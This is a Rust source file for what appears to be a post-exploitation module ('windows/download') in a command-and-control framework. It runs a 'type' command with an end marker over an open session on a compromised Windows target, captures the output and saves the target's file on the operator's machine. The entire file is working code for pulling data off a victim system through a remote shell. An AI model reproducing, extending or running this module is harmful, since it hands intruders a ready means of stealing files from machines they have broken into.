use crate::core::modules::Module;
use crate::core::loghandler::LogHandler;
use std::fs::File;
use std::io::Write;

pub struct DownloadWindows;

impl Module for DownloadWindows {
    fn name(&self) -> &'static str { "windows/download" }
    fn description(&self) -> &'static str { "Download a text file from the target (Windows)" }
    fn run(&self, session_id: usize, session_manager: &crate::core::session::SessionManager, args: Vec<String>) {
        let file_path = match args.get(0) {
            Some(path) => path,
            None => {
                LogHandler::error("No file provided for download");
                return;
            }
        };

        if let Some(session) = session_manager.get(session_id) {
            let mut locked = session.stream.lock().unwrap();
            let marker = "__AEGIS_END__";
            let cmd = format!("type {} & echo {}\n", file_path, marker);
            match crate::cli::output::send_command_and_get_output_until(&mut *locked, &cmd, marker) {
                Ok(data) => {
                    let marker_bytes = marker.as_bytes();
                    if let Some(idx) = data.windows(marker_bytes.len()).rposition(|window| window == marker_bytes) {
                        let file_content = &data[..idx];

                        // Skip the echoed command
                        let first_newline = file_content.iter().position(|&b| b == b'\n' || b == b'\r');
                        let file_bytes = match first_newline {
                            Some(pos) => &file_content[pos+1..],
                            None => file_content,
                        };
                        let filename = std::path::Path::new(file_path)
                            .file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or("downloaded_file");
                        if let Ok(mut f) = File::create(filename) {
                            if let Err(e) = f.write_all(file_bytes) {
                                LogHandler::error(&format!("Failed to write file: {}", e));
                            } else {
                                LogHandler::success(&format!("Downloaded '{}' to '{}'", file_path, filename));
                            }
                        } else {
                            LogHandler::error("Failed to create local file.");
                        }
                    } else {
                        LogHandler::error("End marker not found in output.");
                    }
                }
                Err(e) => LogHandler::error(&format!("Failed to download file: {}", e)),
            }
        }
    }
}